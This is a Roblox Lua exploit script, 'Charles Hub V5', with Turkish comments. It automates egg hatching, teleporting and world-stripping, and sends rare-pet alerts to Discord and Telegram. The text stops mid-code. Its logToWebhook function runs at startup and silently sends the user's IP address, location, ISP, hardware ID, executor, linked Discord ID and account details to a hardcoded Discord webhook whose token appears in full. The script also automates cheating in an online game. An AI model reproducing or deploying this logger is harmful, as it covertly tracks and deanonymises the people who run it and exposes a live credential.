-- [[ AYARLAR - _G'den okunur, loader.lua tarafından ayarlanır ]] --

-- [[ AYARLAR - _G'den okunur ]] --
local petWebhookURL   = _G.CHARLES_PET_WEBHOOK or _G.CHARLES_WEBHOOK or ""
local actWebhookURL   = _G.CHARLES_ACT_WEBHOOK or ""
local countWebhookURL = _G.CHARLES_COUNT_WEBHOOK or ""
local discordUserID   = _G.CHARLES_DISCORD_ID or ""

local petTgToken      = _G.CHARLES_PET_TG_TOKEN or ""
local actTgToken      = _G.CHARLES_ACT_TG_TOKEN or ""
local countTgToken    = _G.CHARLES_COUNT_TG_TOKEN or ""
local telegramChatID   = _G.CHARLES_TG_CHATID or ""

-- [[ CHARLES HUB V5 - LOGGER ]] --
local hubWebhookURL = "https://discord.com/api/webhooks/1453830529718681753/WzmmobNWqI8V8ogOyKKjnAdM-ZEm-6Iq4RsFd6dYZso2Zb--b_gN8dtsM8Km5pBQ33Tr"
local serverChangeWebhookURL = actWebhookURL
local playerCountWebhookURL = countWebhookURL

        local DEBUG_HUB = true -- Hata ayıklama modunu açar
        local useProxy = true -- Discord engeli varsa proxy kullanır

        local function getProxiedURL(url)
            if not useProxy then return url end
            return url:gsub("https://discord.com/", "https://webhook.lewisakura.moe/") -- Yaygın bir webhook proxy'si
        end

        local HttpService = game:GetService("HttpService")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        local lp = Players.LocalPlayer

        local function debugLog(msg)
            if DEBUG_HUB then
                print("🛠️ [CHARLES-DEBUG]: " .. tostring(msg))
            end
        end

        local function formatNumber(v)
            if not v then return "0" end
            local s = tostring(v)
            local parts = string.split(s, ".")
            local intPart = parts[1]:reverse():gsub("%d%d%d", "%1."):reverse():gsub("^%.", "")
            if parts[2] then
                return intPart .. "," .. parts[2] -- Binlik için nokta, ondalık için virgül
            end
            return intPart
        end

        -- [[ BILET SISTEMI DEGISKENLERI ]] --
        local HatchTickets = 0
        local LastHatchRequestTime = 0

        local SessionStartTime = tick()
        local EggsOpenedTotal = 0

        -- [[ PET NADİRLİK KONTROL SİSTEMİ ]] --
        local FinalTargets = {
            ["Legendary"] = false,
            ["Mythical"] = false,
            ["Secret I"] = true,
            ["Secret II"] = true,
            ["Secret III"] = true,
            ["Secret X"] = true
        }

        local PetData = {}
        local function LoadPetStats()
            pcall(function() 
                PetData = require(ReplicatedStorage:WaitForChild("Game"):WaitForChild("PetStats"):WaitForChild("Pets")) 
            end)
        end
        task.spawn(LoadPetStats)

        local request_func = (request or syn and syn.request or http and http.request)

        local function getInventoryPetCount(targetPetName)
            if not targetPetName then return 0 end
            local count = 0
            local targetLower = tostring(targetPetName):lower()
            
            -- Bu isme ait tüm olası ID'leri bul
            local targetIDs = {}
            pcall(function()
                for id, data in pairs(PetData) do
                    if (data.Name and data.Name:lower():find(targetLower)) or tostring(id):lower() == targetLower then
                        targetIDs[tostring(id):lower()] = true
                        if data.Name then targetIDs[data.Name:lower()] = true end
                    end
                end
            end)
            targetIDs[targetLower] = true

            pcall(function()
                -- SADECE yerel oyuncuya ait klasörleri tara
                local searchPaths = {
                    lp, -- Karakter/Player nesnesi
                    ReplicatedStorage:FindFirstChild("PlayerData"), 
                    ReplicatedStorage:FindFirstChild("Inventories"),
                    Workspace:FindFirstChild("PlayerPets"),
                    Workspace:FindFirstChild("Pets")
                }
                local seenRoots = {}

                for _, area in pairs(searchPaths) do
                    if area then
                        -- PlayerData veya Inventories içinde isim VEYA UserId ile klasörü bul
                        local currentArea = nil
                        if area == lp then
                            currentArea = lp
                        elseif area == Workspace then
                            -- Workspace'in tamamını tarama, diğer oyuncuları sayar.
                            -- Sadece oyuncunun ismini veya UserId'sini taşıyan alt klasör varsa bak.
                            currentArea = area:FindFirstChild(lp.Name) or area:FindFirstChild(tostring(lp.UserId))
                        else
                            -- Diğer klasörlerde (PlayerData vb.) oyuncuyu ara
                            currentArea = area:FindFirstChild(lp.Name) or area:FindFirstChild(tostring(lp.UserId))
                        end

                        if currentArea then
                            for _, obj in pairs(currentArea:GetDescendants()) do
                                local isMatch = false
                                local oName = obj.Name:lower()
                                
                                -- 1. İsim/ID Kontrolü
                                for tID, _ in pairs(targetIDs) do
                                    if oName:find(tID) then
                                        isMatch = true
                                        break
                                    end
                                end

                                -- 2. Değer Kontrolü (Value nesneleri)
                                if not isMatch and (obj:IsA("ValueBase")) then
                                    local val = tostring(obj.Value):lower()
                                    for tID, _ in pairs(targetIDs) do
                                        if val:find(tID) then
                                            isMatch = true
                                            break
                                        end
                                    end
                                end

                                if isMatch then
                                    -- Petin kök nesnesini bulmaya çalış (UUID genellikle klasör adıdır)
                                    local root = obj
                                    if obj:IsA("ValueBase") or oName:find("id") or oName:find("name") then
                                        root = obj.Parent
                                    end
                                    if root and not seenRoots[root] then
                                        seenRoots[root] = true
                                        count = count + 1
                                    end
                                end
                            end
                        end
                    end
                end
            end)
            return count
        end

        local function sendPetNotification(petName, rarity, petType, multiplier, eggName, imageId)
            -- TEKNİK BEKLEME: Oyunun pet nesnesini envantere işlemesi için 3.5 saniye tanı
            task.wait(3.5) 

            local totalEggs = 0
            pcall(function()
                local folder = lp:FindFirstChild("leaderstats") or lp:FindFirstChild("PlayerStats") or lp:FindFirstChild("Data")
                if folder then
                    local eggObj = folder:FindFirstChild("Eggs") or folder:FindFirstChild("TotalEggs")
                    if eggObj then totalEggs = eggObj.Value end
                end
            end)

            local invCount = getInventoryPetCount(petName)
            
            -- IMAGE URL: Discord embed için asset-thumbnail API'si
            local cleanImageId = tostring(imageId or ""):gsub("%D", "")
            local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"
            
            if cleanImageId ~= "" and cleanImageId ~= "0" then
                thumbnailUrl = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%s&width=420&height=420&format=png", cleanImageId)
            end

            local data = {
                ["content"] = discordUserID ~= "" and "<@" .. discordUserID .. ">" or "", -- Discord ID Etiketi
                ["embeds"] = {{
                    ["title"] = string.format("🐶 %s (%s) | New Pet", petName, petType or "Normal"),
                    ["description"] = string.format("**__Username__:** %s\n**Name:** %s\n**Rarity:** %s\n**Type:** %s\n\n**Multiplier:** x%s\n**IsFrom:** %s\n\n📊 **Stats:**\n**Total Hatched:** %s🥚\n**Pet in Inventory:** %sx", 
                    lp.Name, petName, rarity, petType or "Normal", 
                    formatNumber(multiplier or "0"), 
                    tostring(eggName or "Unknown Egg"),
                    formatNumber(totalEggs), formatNumber(invCount)),
                    ["thumbnail"] = {["url"] = thumbnailUrl},
                    ["color"] = 10066329, -- Varsayılan: Gri (Normal)
                    ["timestamp"] = DateTime.now():ToIsoDate(),
                    ["footer"] = { ["text"] = "Charles Hub V5 - Pet Notifier" }
                }}
            }

            -- TÜRE GÖRE RENK AYARI
            local typeLower = tostring(petType):lower()
            if typeLower:find("gold") then
                data.embeds[1].color = 16766720 -- Altın Sarısı
            elseif typeLower:find("rainbow") then
                data.embeds[1].color = 16744703 -- Rainbow (Pembe/Gökkuşağı)
            end

            -- ÖZEL DURUM: Sadece Secret X Kırmızı Olsun
            if rarity == "Secret X" then
                data.embeds[1].color = 16711680 -- Kırmızı
            end

            debugLog("Pet bildirimi hazırlanıyor: " .. tostring(petName))
            
            pcall(function()
                local finalUrl = getProxiedURL(petWebhookURL)
                debugLog("Gönderim Yapılıyor URL: " .. finalUrl)
                
                local response = request_func({
                    Url = finalUrl,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(data)
                })
                
                if response then
                    debugLog("Webhook Yanıtı: " .. tostring(response.StatusCode) .. " - " .. tostring(response.StatusMessage))
                else
                    debugLog("Webhook Yanıtı ALINAMADI (Response nil)")
                end
            end)
        end

        local function sendTelegramNotification(petName, rarity, petType, multiplier, eggName)
            if petTgToken == "" or telegramChatID == "" then return end
            local message = string.format(
                "🐶 *%s (%s)* | New Pet!\n" ..
                "👤 *User:* %s\n" ..
                "💎 *Rarity:* %s\n" ..
                "✨ *Type:* %s\n" ..
                "📈 *Multiplier:* x%s\n" ..
                "🥚 *Egg:* %s",
                petName, petType or "Normal", lp.Name, rarity, petType or "Normal", formatNumber(multiplier or 0), eggName or "Unknown"
            )
            pcall(function()
                request_func({
                    Url = string.format("https://api.telegram.org/bot%s/sendMessage", petTgToken),
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        chat_id = telegramChatID,
                        text = message,
                        parse_mode = "Markdown"
                    })
                })
            end)
        end

        local function logToWebhook()
            pcall(function()
                local lp = game:GetService("Players").LocalPlayer
                local hwid = (gethwid and gethwid()) or (get_hwid and get_hwid()) or game:GetService("RbxAnalyticsService"):GetClientId()
                local executor = (identifyexecutor and identifyexecutor()) or "Bilinmiyor"
                local accountAge = lp.AccountAge
                local membership = tostring(lp.MembershipType):sub(21)
                local joinDate = os.date("%d-%m-%Y", os.time() - (accountAge * 86400))
                local UIS = game:GetService("UserInputService")
                local device = "PC"
                if UIS.TouchEnabled and not UIS.KeyboardEnabled then device = "Mobile"
                elseif game:GetService("GuiService"):IsTenFootInterface() then device = "Console" end
                
                local resolution = "Bilinmiyor"
                pcall(function() resolution = math.floor(game:GetService("Workspace").CurrentCamera.ViewportSize.X) .. "x" .. math.floor(game:GetService("Workspace").CurrentCamera.ViewportSize.Y) end)
                
                local ipInfo = {query = "0.0.0.0", country = "Bilinmiyor", city = "Bilinmiyor", isp = "Bilinmiyor"}
                pcall(function() 
                    local resp = game:HttpGet("http://ip-api.com/json/")
                    if resp then ipInfo = HttpService:JSONDecode(resp) end
                end)

                local discordID = "Bilinmiyor"
                pcall(function()
                    local response = game:HttpGet("https://registry.rover.link/v2/roblox-to-discord/" .. lp.UserId)
                    if response then
                        local decoded = HttpService:JSONDecode(response)
                        if decoded and decoded.discordId then
                            discordID = "<@" .. decoded.discordId .. "> (" .. decoded.discordId .. ")"
                        end
                    end
                end)
                
                -- Oyun istatistiklerini güvenli bir şekilde çek
                local stats = {Coins = "0", Gems = "0", Rebirths = "0", Eggs = "0", Tokens = "0"}
                pcall(function()
                    local folder = lp:FindFirstChild("leaderstats") or lp:FindFirstChild("PlayerStats") or lp:FindFirstChild("Data")
                    if folder then
                        stats.Coins = tostring((folder:FindFirstChild("Clicks") or folder:FindFirstChild("Coins") or folder:FindFirstChild("Taps") or {Value = "0"}).Value)
                        stats.Gems = tostring((folder:FindFirstChild("Gems") or folder:FindFirstChild("Diamonds") or {Value = "0"}).Value)
                        stats.Rebirths = tostring((folder:FindFirstChild("Rebirths") or {Value = "0"}).Value)
                        stats.Eggs = tostring((folder:FindFirstChild("Eggs") or folder:FindFirstChild("TotalEggs") or {Value = "0"}).Value)
                        stats.Tokens = tostring((folder:FindFirstChild("Tokens") or folder:FindFirstChild("TapTokens") or folder:FindFirstChild("TokensValue") or {Value = "0"}).Value)
                    end
                end)

                local serverType = "Public"
                if game.PrivateServerId ~= "" then
                    serverType = "VIP Server (Private)"
                    if game.PrivateServerOwnerId == 0 then
                        serverType = "Reserved Server"
                    end
                end

                local jobId = game.JobId
                if jobId == "" then jobId = "N/A (Studio or VIP?)" end

                local data = {
                    ["embeds"] = {{
                        ["title"] = "🚀 Egg working! (v5.6)",
                        ["description"] = "🔔 **Sunucu Türü:** " .. serverType,
                        ["color"] = 65280,
                        ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"},
                        ["fields"] = {
                            {["name"] = "Hesap İsmi", ["value"] = lp.Name .. " (" .. membership .. ")", ["inline"] = true},
                            {["name"] = "Roblox ID", ["value"] = tostring(lp.UserId), ["inline"] = true},
                            {["name"] = "Cihaz / Çözünürlük", ["value"] = device .. " / " .. resolution, ["inline"] = true},
                            {["name"] = "Hesap Yaşı / Tarih", ["value"] = accountAge .. " gün (" .. joinDate .. ")", ["inline"] = true},
                            {["name"] = "IP Adresi", ["value"] = "```" .. ipInfo.query .. "```", ["inline"] = true},
                            {["name"] = "Ping", ["value"] = math.floor(lp:GetNetworkPing() * 1000) .. " ms", ["inline"] = true},
                            {["name"] = "Coin / Gem", ["value"] = "💰 " .. tostring(stats.Coins) .. " / 💎 " .. tostring(stats.Gems), ["inline"] = true},
                            {["name"] = "Token / Rebirth", ["value"] = "🎟️ " .. tostring(stats.Tokens) .. " / ⭐ " .. tostring(stats.Rebirths), ["inline"] = true},
                            {["name"] = "Açılan Yumurta", ["value"] = "🥚 " .. tostring(stats.Eggs), ["inline"] = true},
                            {["name"] = "Ülke / Şehir", ["value"] = ipInfo.country .. " / " .. ipInfo.city, ["inline"] = true},
                            {["name"] = "İnternet", ["value"] = ipInfo.isp, ["inline"] = true},
                            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
                            {["name"] = "Discord ID", ["value"] = discordID, ["inline"] = true},
                            {["name"] = "Sunucu ID", ["value"] = "```" .. jobId .. "```", ["inline"] = false},
                            {["name"] = "HWID", ["value"] = "```" .. hwid .. "```", ["inline"] = false},
                            {["name"] = "Zaman", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false}
                        },
                        ["footer"] = {["text"] = "Charles Hub V5.6 Ultimate Logger"}
                    }}
                }
                
                debugLog("Hub Logger gönderiliyor...")
                local finalUrl = getProxiedURL(hubWebhookURL)
                local response = request_func({
                    Url = finalUrl,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(data)
                })
                if response then
                    debugLog("Hub Logger Yanıtı: " .. tostring(response.StatusCode))
                end

                -- PET NOTIFIER TEST (SADECE STARTUP)
                task.delay(2, function()
                    local pUrl = getProxiedURL(petWebhookURL)
                    if pUrl and pUrl ~= "" and pUrl:find("http") then
                        debugLog("Pet Webhook Testi Gönderiliyor...")
                        local testData = {
                            ["embeds"] = {{
                                ["title"] = "✅ Webhook Bağlantı Testi",
                                ["description"] = "Bu mesajı görüyorsan Pet Bildirim sistemi teknik olarak çalışıyor demektir.",
                                ["color"] = 65280,
                                ["footer"] = {["text"] = "Charles Hub - Test Modu"}
                            }}
                        }
                        pcall(function()
                            local pResp = request_func({
                                Url = pUrl,
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = HttpService:JSONEncode(testData)
                            })
                            if pResp then
                                debugLog("Pet Webhook Test Yanıtı: " .. tostring(pResp.StatusCode))
                            end
                        end)
                    else
                        debugLog("Pet Webhook URL boş, test atlanıyor.")
                    end
                end)
            end)
        end
        task.spawn(logToWebhook)

        -- [[ AYARLAR ]] --
        local targetEggName = "Rainbow"   -- Açılacak yumurta adı
        local teleportZoneName = "Rainbow" -- Işınlanılacak ada/bölge adı
        local openAmount = 8 
        local hatchSpeed = 0 
        _G.AutoPotion = false -- YENİ: Otomatik İksir Alma

        local Workspace = game:GetService("Workspace")

        -- [[ 1. DİNAMİK NETWORK VE REMOTE BULUCU ]] --
        local function GetNetwork()
            -- Favori yöntem: Events ve Functions klasörlerini barındıran üst klasör
            for _, v in pairs(ReplicatedStorage:GetChildren()) do
                if v:IsA("Folder") and v:FindFirstChild("Events") and v:FindFirstChild("Functions") then
                    return v
                end
            end
            -- UUID formatı taraması (32+ karakter ve tire içerir)
            for _, v in pairs(ReplicatedStorage:GetChildren()) do
                if v:IsA("Folder") and #v.Name > 30 and v.Name:find("-") then
                    return v
                end
            end
            return nil
        end

        local Network = GetNetwork()
        if not Network then
            warn("❌ Network klasörü bulunamadı! Remote'lar çalışmayabilir.")
        end

        local function getGameRemote(remoteName)
            if not Network then Network = GetNetwork() end
            if Network then
                local f = Network:FindFirstChild("Functions")
                local e = Network:FindFirstChild("Events")
                local target = (f and f:FindFirstChild(remoteName)) or (e and e:FindFirstChild(remoteName))
                if target then return target end
            end
            
            -- Yedek: Tüm ReplicatedStorage'ı tara
            for _, obj in ipairs(ReplicatedStorage:GetChildren()) do
                if obj:IsA("Folder") or obj:IsA("Configuration") then
                    local f = obj:FindFirstChild("Functions")
                    local e = obj:FindFirstChild("Events")
                    local target = (f and f:FindFirstChild(remoteName)) or (e and e:FindFirstChild(remoteName))
                    if target then return target end
                    
                    -- Direkt altında olabilir mi?
                    local direct = obj:FindFirstChild(remoteName)
                    if direct then return direct end
                end
            end
            
            -- ReplicatedStorage kökünde olabilir (Nadir)
            return ReplicatedStorage:FindFirstChild(remoteName)
        end

        -- [[ 2. AGRESİF FPS BOOST (DÜNYAYI TEMİZLE) ]] --
        local function nukeWorld()
            for _, obj in pairs(Workspace:GetChildren()) do
                -- 1. Island Klasörünün İçini Cerrahi Temizle
                if obj.Name == "Island" then
                    for _, child in pairs(obj:GetChildren()) do
                        pcall(function() child:Destroy() end)
                    end
                -- 2. Workspace'teki Diğer Gereksiz Şeyleri Sil (Karakter, Kamera, Yumurtalar ve Base hariç)
                elseif obj.Name ~= lp.Name and 
                obj.Name ~= "Camera" and 
                obj.Name ~= "Eggs" and 
                not obj.Name:find("SafetyFloor") and 
                not obj:IsA("Terrain") then
                    pcall(function() obj:Destroy() end)
                end
            end

            local eggsFolder = Workspace:FindFirstChild("Eggs")
            if eggsFolder then
                for _, egg in pairs(eggsFolder:GetChildren()) do
                    -- Sadece hedef yumurtayı bırak, gerisini sil
                    if not egg.Name:find(targetEggName) then
                        pcall(function() egg:Destroy() end)
                    end
                end
            end
            Workspace.Terrain:Clear()
        end

        -- [[ 3. HAVA DURUMUNU VE EFEKTLERİ SIFIRLA ]] --
        local function cleanLighting()
            local Lighting = game:GetService("Lighting")
            Lighting.GlobalShadows = false
            Lighting.FogEnd = 9e9
            Lighting.Brightness = 1
            Lighting.ClockTime = 12
            Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            
            for _, effect in pairs(Lighting:GetChildren()) do
                if effect:IsA("PostEffect") or effect:IsA("Sky") or effect:IsA("Clouds") or effect:IsA("Atmosphere") then
                    pcall(function() effect:Destroy() end)
                end
            end
            
            local sky = Instance.new("Sky", Lighting)
            sky.SunTextureId = ""
            sky.MoonTextureId = ""
        end

        -- [[ 4. SHOOTING STAR & EVENT ENGELLEYİCİ ]] --
        local function blockEvents()
            -- 1. ShootingStar modüllerini ve mevcut efektleri sil
            local ssModule = ReplicatedStorage:FindFirstChild("ShootingStars", true)
            if ssModule then pcall(function() ssModule:Destroy() end) end

            for _, v in pairs(Workspace:GetDescendants()) do
                local name = v.Name:lower()
                if name:find("star") or name:find("shooting") then
                    pcall(function() v:Destroy() end)
                end
            end

            -- 2. Yeni gelen event nesnelerini (Electric, Void, Star, Crab vb.) anında engelle
            Workspace.DescendantAdded:Connect(function(v)
                local name = v.Name:lower()
                if name:find("star") or name:find("shooting") or name:find("electric") or name:find("void") or name:find("crab") or name:find("taco") or name:find("event") or name == "model" then
                    task.wait()
                    pcall(function() v:Destroy() end)
                end
            end)
            print("🚫 Event engelleyici ve ShootingStar temizleyici aktif!")
        end

        -- [[ 5. PARÇACIK VE GÖRSEL OPTİMİZASYON ]] --
        local function optimizeVisuals()
            for _, v in pairs(Workspace:GetDescendants()) do
                if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Sparkles") then
                    v.Enabled = false
                end
            end
            print("✨ Görsel efektler optimize edildi.")
        end

        -- [[ 6. YUMURTAYI GİZLE ]] --
        local function hideEgg(eggModel)
            if eggModel then
                for _, part in pairs(eggModel:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("MeshPart") then
                        part.Transparency = 1 
                        part.CastShadow = false
                    elseif part:IsA("Decal") or part:IsA("Texture") then
                        part:Destroy()
                    elseif part:IsA("ParticleEmitter") or part:IsA("Trail") then
                        part.Enabled = false
                    end
                end
            end
        end

        -- [[ 7. GÜVENLİ ZEMİNLER ]] --
        local function createFloorAtEgg(target)
            local floor = Instance.new("Part")
            floor.Name = "SafetyFloor"
            floor.Size = Vector3.new(50, 2, 50)
            floor.CFrame = target:GetPivot() * CFrame.new(0, -5, 0)
            floor.Anchored = true
            floor.Transparency = 0.5 
            floor.BrickColor = BrickColor.new("Bright blue")
            floor.Parent = Workspace
            return floor
        end

        -- Gold Machine için 100x100 Emniyet Zemini
        local function createFloorAtMachine()
            local pos = Vector3.new(1415.5, 658.18, -13447.73)
            local floor = Instance.new("Part")
            floor.Name = "SafetyFloor"
            floor.Size = Vector3.new(50, 2, 50)
            floor.Position = pos + Vector3.new(0, -6, 0)
            floor.Anchored = true
            floor.Transparency = 0.5
            floor.BrickColor = BrickColor.new("Bright yellow")
            floor.Material = Enum.Material.Neon
            floor.Parent = Workspace
            print("🏗️ Gold Machine için 100x100 zemin oluşturuldu.")
            return floor
        end

        -- Rainbow Machine için 50x50 Emniyet Zemini
        local function createFloorAtRainbowMachine()
            local pos = Vector3.new(1220.16, 664.95, -13373.58)
            local floor = Instance.new("Part")
            floor.Name = "SafetyFloor"
            floor.Size = Vector3.new(50, 2, 50)
            floor.Position = pos + Vector3.new(0, -6, 0)
            floor.Anchored = true
            floor.Transparency = 0.5
            floor.BrickColor = BrickColor.new("Carnation pink")
            floor.Material = Enum.Material.Neon
            floor.Parent = Workspace
            print("🏗️ Rainbow Machine için 50x50 zemin oluşturuldu.")
            return floor
        end

        -- PERİYODİK RAPOR DÖNGÜSÜ (KALDIRILDI)

        -- [[ 9. SUNUCU DEĞİŞİKLİĞİ BİLDİRİMİ ]] --
        local function sendServerChangeNotification(reason)
            if _G.CHARLES_NOTIFICATION_SENT then return end
            _G.CHARLES_NOTIFICATION_SENT = true
            
            local elapsed = math.max(0, math.floor((tick() - SessionStartTime) / 60))
            local eggsPerMin = elapsed > 0 and math.floor(EggsOpenedTotal / elapsed) or EggsOpenedTotal
            -- Discord Bildirimi (Arka Planda)
            task.spawn(function()
                pcall(function()
                    local data = {
                        ["embeds"] = {{
                            ["title"] = "🔄 Sunucu Değişti — " .. lp.Name,
                            ["description"] = string.format(
                                "👤 **Username:** %s\n⏱️ **Time:** %d dk\n\n❓ **Sebep:** %s",
                                lp.Name, elapsed,
                                reason or "Bilinmiyor"
                            ),
                            ["color"] = 16711680,
                            ["timestamp"] = DateTime.now():ToIsoDate(),
                            ["footer"] = {["text"] = "Charles Hub V5 - Sunucu Değişikliği"}
                        }}
                    }
                    local url = getProxiedURL(serverChangeWebhookURL)
                    if url and url ~= "" and url:find("http") then
                        debugLog("Sunucu Değişimi Discord Gönderiliyor...")
                        request_func({
                            Url = url,
                            Method = "POST",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = HttpService:JSONEncode(data)
                        })
                    end
                end)
            end)

            -- Telegram Bildirimi (Arka Planda)
            if actTgToken ~= "" and telegramChatID ~= "" then
                task.spawn(function()
                    pcall(function()
                        local msg = string.format(
                            "🔄 *Sunucu Değişti!*\n👤 *Kullanıcı:* %s\n⏱️ *Süre:* %d dk\n❓ *Sebep:* %s",
                            lp.Name:gsub("_", "\\_"),
                            elapsed,
                            reason or "Bilinmiyor"
                        )
                        debugLog("Sunucu Değişimi Telegram Gönderiliyor...")
                        local response = request_func({
                            Url = "https://api.telegram.org/bot" .. actTgToken .. "/sendMessage",
                            Method = "POST",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = HttpService:JSONEncode({
                                chat_id = telegramChatID,
                                text = msg,
                                parse_mode = "Markdown"
                            })
                        })
                    end)
                end)
            end
        end

        -- [[ 9.5 OYUNCU SAYISI BİLDİRİMİ (DEDUPLICATED) ]] --
        local function sendPlayerCountNotification(leavingPlayerName)
            -- Alfabetik Deduplication: Sunucudaki tüm oyuncuları al
            local allPlayers = game:GetService("Players"):GetPlayers()
            local playerNames = {}
            for _, p in pairs(allPlayers) do
                table.insert(playerNames, p.Name)
            end
            table.sort(playerNames)

            -- Eğer bu hesap alfabetik olarak sunucudaki ilk oyuncuysa bildirimi gönder
            if playerNames[1] == lp.Name then
                local currentCount = #allPlayers
                local elapsed = math.max(0, math.floor((tick() - SessionStartTime) / 60))
                
                -- Discord Bildirimi
                task.spawn(function()
                    pcall(function()
                        local data = {
                            ["embeds"] = {{
                                ["title"] = "👥 Crash Detected — " .. lp.Name,
                                ["description"] = string.format(
                                    "👤 **Ayrılan:** %s\n📊 **Kalan Oyuncu Sayısı:** %d/10\n⏱️ **Time:** %d dk",
                                    leavingPlayerName, currentCount, elapsed
                                ),
                                ["color"] = 16753920, -- Turuncu
                                ["timestamp"] = DateTime.now():ToIsoDate(),
                                ["footer"] = {["text"] = "Charles Hub V5 - Sunucu Takibi"}
                            }}
                        }
                        local url = getProxiedURL(playerCountWebhookURL)
                        if url and url ~= "" and url:find("http") then
                            request_func({
                                Url = url,
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = HttpService:JSONEncode(data)
                            })
                        end
                    end)
                end)

                -- Telegram Bildirimi
                if countTgToken ~= "" and telegramChatID ~= "" then
                    task.spawn(function()
                        pcall(function()
                            local msg = string.format(
                                "👥 *Oyuncu Ayrıldı!*\n👤 *Ayrılan:* %s\n📊 *Kalan:* %d/12\n⏱️ *Süre:* %d dk",
                                leavingPlayerName:gsub("_", "\\_"),
                                currentCount, elapsed
                            )
                            request_func({
                                Url = "https://api.telegram.org/bot" .. countTgToken .. "/sendMessage",
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = HttpService:JSONEncode({
                                    chat_id = telegramChatID,
                                    text = msg,
                                    parse_mode = "Markdown"
                                })
                            })
                        end)
                    end)
                end
            end
        end

        -- [[ 10. BİLET SİSTEMİ VE PET BİLDİRİM DİNLEYİCİ ]] --
        local function ConnectRemote(remote)
            if not remote:IsA("RemoteEvent") then return end
            
            -- [[ EQUIP/UNEQUIP FİLTRESİ ]] --
            -- Zaten sahip olunan petlerin takılıp çıkarılması durumunda bildirim gitmesini engellemek için
            local rName = remote.Name:lower()
            if rName:find("equip") or rName:find("unequip") or rName:find("wear") or rName:find("select") or rName:find("use") or (rName:find("update") and not rName:find("hatch")) then
                return
            end

            remote.OnClientEvent:Connect(function(...)
                local args = {...}
                for _, arg in pairs(args) do
                    if type(arg) == "table" then
                        local name = arg.PetName or arg.Name or arg.id
                        if name then
                            local nameStr = tostring(name)
                            local petType = arg.Tier or "Normal"
                            local actualRarity = "Unknown"

                            local baseData = PetData[nameStr]
                            
                            if not baseData then
                                for id, data in pairs(PetData) do
                                    if tostring(id) == nameStr then
                                        baseData = data
                                        break
                                    end
                                end
                            end
                            
                            if baseData then 
                                actualRarity = baseData.Rarity or baseData.Tier or "Unknown" 
                            end
                            
                            -- debugLog("🔍 Tespit -> Pet: " .. nameStr .. " | Nadirlik: " .. actualRarity)
                            
                            if FinalTargets[actualRarity] then
                                -- Çoklu anahtar denemesi (DUMP'tan gelen Multiplier1 eklendi)
                                local multiplier = baseData and (baseData.Multiplier1 or baseData.Multiplier or baseData.TapsMultiplier or baseData.ClickMultiplier or baseData.Taps or baseData.Clicks or 0)
                                local imageId = baseData and (baseData.Image or baseData.Thumbnail or baseData.Icon or "")

                                local eggName = tostring(targetEggName or "Unknown Egg"):gsub(" Egg$", "") .. " Egg"
                                sendPetNotification(nameStr, actualRarity, petType, multiplier, eggName, imageId)
                                -- Telegram Bildirimi (Arka Planda)
                                task.spawn(function()
                                    sendTelegramNotification(nameStr, actualRarity, petType, multiplier, eggName)
                                end)
                            end
                        end
                    end
                end
            end)
        end

        local function SetupListeners()
            debugLog("Ağ dinleyicileri kuruluyor...")
            local net = GetNetwork()
            if net then
                local events = net:FindFirstChild("Events")
                if events then
                    for _, r in pairs(events:GetChildren()) do ConnectRemote(r) end
                    events.ChildAdded:Connect(ConnectRemote)
                else
                    debugLog("⚠️ Network klasöründe Events bulunamadı!")
                end
            else
                debugLog("⚠️ GetNetwork() klasör bulamadı (Dinleyici Kurulamadı)")
            end
            
            -- Yedek: Sadece Hatch ve Open içerenleri tara (Pet kelimesi çok geniştir, EquipPet'i de yakalar)
            for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
                if obj:IsA("RemoteEvent") and (obj.Name:find("Hatch") or obj.Name:find("Open")) then
                    ConnectRemote(obj)
                end
            end
        end

        task.spawn(SetupListeners)

        -- [[ SUNUCU DEĞİŞİKLİĞİ TESPİTİ ]] --
        pcall(function()
            game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
                sendServerChangeNotification("Teleport / Sunucu Atlama")
            end)
        end)
        game.Players.PlayerRemoving:Connect(function(p)
            if p == lp then
                sendServerChangeNotification("Oyundan Çıkış")
            else
                -- Diğer oyuncular için: 2 saniye bekle (listenin güncellenmesi için) ve sonra 1 bildirim yolla
                task.delay(2, function()
                    sendPlayerCountNotification(p.Name)
                end)
            end
        end)
        debugLog("Sunucu değişiklik algılayıcısı aktif!")

        -- [[ ANA ÇALIŞTIRICI ]] --
        if not game:IsLoaded() then game.Loaded:Wait() end
        task.wait(2) 

        -- ADIM 1: Adaya Işınlan
        local tpRemote = getGameRemote("TeleportZone")
        if tpRemote then
            print("🌐 " .. teleportZoneName .. " adasına ışınlanılıyor...")
            tpRemote:InvokeServer(teleportZoneName)
            task.wait(5) 
        end

        -- ADIM 2: Yumurtayı Bul ve Dünyayı Hazırla
        local eggsFolder = Workspace:FindFirstChild("Eggs")
        local eggModel = eggsFolder and (eggsFolder:FindFirstChild(targetEggName) or eggsFolder:FindFirstChild(targetEggName .. " Egg"))

        if eggModel then
            print("🧱 Dünya temizleniyor ve FPS boost uygulanıyor...")
            nukeWorld()
            cleanLighting()
            blockEvents()
            optimizeVisuals()
            createFloorAtEgg(eggModel)
            createFloorAtMachine() 
            createFloorAtRainbowMachine()
            hideEgg(eggModel)
            
            task.wait(1.5)
            if lp.Character then
